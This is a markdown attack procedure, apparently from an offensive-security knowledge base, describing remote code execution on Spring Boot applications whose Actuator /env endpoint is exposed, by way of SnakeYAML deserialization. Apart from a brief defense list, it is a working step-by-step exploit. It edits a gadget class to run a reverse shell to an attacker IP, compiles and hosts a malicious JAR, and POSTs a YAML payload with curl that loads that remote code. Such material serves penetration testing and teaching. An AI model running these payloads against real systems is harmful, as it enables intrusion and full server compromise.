---
id: 2fc1b204-742b-41b5-9df2-5cde71aeb3d4
type: procedure
verified: true
submitted: true
tactics:
  - '[[Execution]]'
techniques:
  - '[[Exploitation for Client Execution]]'
sub_techniques: []
tags:
  - rce
  - deserialization
  - spring-boot
  - actuator
  - yaml
  - insecure-management-interface
commands:
  - '[[commands/git-clone-yaml-payload-repo]]'
  - '[[commands/bash-cd-to-yaml-payload-dir]]'
  - '[[commands/javac-compile-awesome-script-engine-factory]]'
  - '[[commands/jar-create-yaml-payload-archive]]'
  - '[[commands/curl-post-malicious-yaml-to-actuator-env]]'
platforms:
  - Java
  - Web
tools: []
created_at: '2023-04-06T03:55:59.666424+00:00'
updated_at: '2023-05-26T18:52:37.745092+00:00'
validated: true
---

# Remote-Code-Execution-via-Spring-Boot-Actuator-Env

## Summary

This procedure exploits a deserialization vulnerability in the Spring Boot Actuator /env endpoint, which uses the SnakeYAML library to parse YAML-formatted environment properties. By crafting a malicious YAML payload that triggers deserialization of a custom gadget chain, an attacker can achieve remote code execution (RCE) on the target server. This is useful in scenarios where the Actuator endpoints are exposed without proper authentication, allowing arbitrary property manipulation that leads to code execution.

## Description

The Spring Boot Actuator provides management endpoints like /actuator/env for viewing and modifying application environment properties. When POST requests are used to set properties in YAML format (via Content-Type: application/x-yaml), the SnakeYAML deserializer processes the input. If the application uses an insecure deserialization configuration, a crafted YAML payload can instantiate a gadget chain leading to RCE. This procedure prepares a custom Java gadget using the yaml-payload repository, hosts it, crafts the YAML to reference it, and sends it to the endpoint. The target environment is a Spring Boot application with Actuator enabled and /env exposed (often on port 8080). Success results in arbitrary command execution on the server, potentially leading to full compromise. This maps to exploitation of server-side deserialization flaws common in Java applications.

## Requirements

1. Network access to the target's Actuator /env endpoint (e.g., http://target:8080/actuator/env).
2. Java Development Kit (JDK) installed on the attacker's machine for compiling the gadget.
3. A web server to host the malicious JAR file (e.g., Python's SimpleHTTPServer).
4. Tools like curl for sending the POST request.
5. Knowledge of the target's Spring Boot version vulnerable to SnakeYAML deserialization (pre-patched versions).

## Defense

- Disable or secure Actuator endpoints with authentication (e.g., Spring Security) and restrict exposure to internal networks only.
- Set management.endpoints.web.exposure.include to exclude /env or use read-only mode.
- Upgrade SnakeYAML to version 2.0+ with secure deserialization (disable unsafe constructors).
- Implement web application firewall (WAF) rules to block suspicious YAML payloads or deserialization attempts.
- Monitor for anomalous Java process spawns or network connections from the application server.

## Objectives

1. Prepare a custom deserialization gadget for RCE.
2. Deliver the malicious YAML payload to the /env endpoint.
3. Achieve arbitrary code execution on the target server.
4. Verify execution via a reverse shell or command output.

## Instructions

### Step 1: Clone the yaml-payload Repository

**Context**: Obtain the source code for the deserialization gadget chain, which includes the AwesomeScriptEngineFactory class used to trigger RCE via ScriptEngine instantiation.

**Command** ([[commands/git-clone-yaml-payload-repo]]):
```bash
git clone https://github.com/artsploit/yaml-payload.git
```

> This clones the repository containing the Java gadget. Expected output includes cloning progress and confirmation of the yaml-payload directory creation. If the directory already exists, Git will prompt to update or error out.

### Step 2: Change to the yaml-payload Directory

**Context**: Navigate into the cloned repository to access the source files for editing and compilation.

**Command** ([[commands/bash-cd-to-yaml-payload-dir]]):
```bash
cd yaml-payload
```

> This changes the working directory. Expected output is a new prompt in the yaml-payload folder. Verify with `pwd` showing the correct path.

### Step 3: Edit the AwesomeScriptEngineFactory for Custom Payload

**Context**: Modify the Java class to inject the desired RCE command, such as opening a reverse shell or executing a whoami. This step is crucial to customize the payload for the target.

**Instructions**: Open `src/artsploit/AwesomeScriptEngineFactory.java` in a text editor. Locate the line with `Runtime.getRuntime().exec(` and replace the default command (e.g., "calc") with your payload, such as `Runtime.getRuntime().exec("bash -i >& /dev/tcp/$_ATTACKER_IP/$_ATTACKER_PORT 0>&1");`. Save the file.

> No command here; manual edit. Expected outcome: Modified Java file ready for compilation. If not edited, the default payload executes.

### Step 4: Compile the AwesomeScriptEngineFactory Class

**Context**: Compile the edited Java source into bytecode for inclusion in the JAR gadget.

**Command** ([[commands/javac-compile-awesome-script-engine-factory]]):
```bash
javac src/artsploit/AwesomeScriptEngineFactory.java
```

> This compiles the class. Expected output: No errors, with AwesomeScriptEngineFactory.class generated in src/artsploit/. Errors indicate syntax issues from editing.

### Step 5: Create the Malicious JAR Archive

**Context**: Package the compiled class into a JAR file that can be referenced by the YAML deserializer.

**Command** ([[commands/jar-create-yaml-payload-archive]]):
```bash
jar -cvf yaml-payload.jar -C src/ .
```

> This creates the JAR. Expected output: Added files list, confirming yaml-payload.jar creation. The JAR now contains the gadget.

### Step 6: Host the JAR File on a Web Server

**Context**: Make the JAR accessible via HTTP so the YAML payload can load it remotely during deserialization.

**Instructions**: Start a simple HTTP server in the yaml-payload directory, e.g., using Python: `python3 -m http.server 8000`. Note your attacker's IP and use port 8000. The JAR will be available at http://$_ATTACKER_IP:8000/yaml-payload.jar.

> Expected: Server logs showing it's running. Test access from another machine.

### Step 7: Craft and Send the Malicious YAML Payload

**Context**: Construct the YAML that triggers deserialization by loading the hosted JAR and instantiating the gadget, leading to RCE.

**Command** ([[commands/curl-post-malicious-yaml-to-actuator-env]]):
```bash
curl -X POST http://$_TARGET_HOST:$_TARGET_PORT/actuator/env -H "Content-Type: application/x-yaml" --data "!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [ !!java.net.URL [\"http://$_ATTACKER_IP:8000/yaml-payload.jar\"] ] ]"
```

> This POSTs the YAML to /env, forcing deserialization. Expected output: HTTP 200 OK or property set confirmation; monitor your listener for the reverse shell connection. If failed, check for auth errors or deserialization disabled.
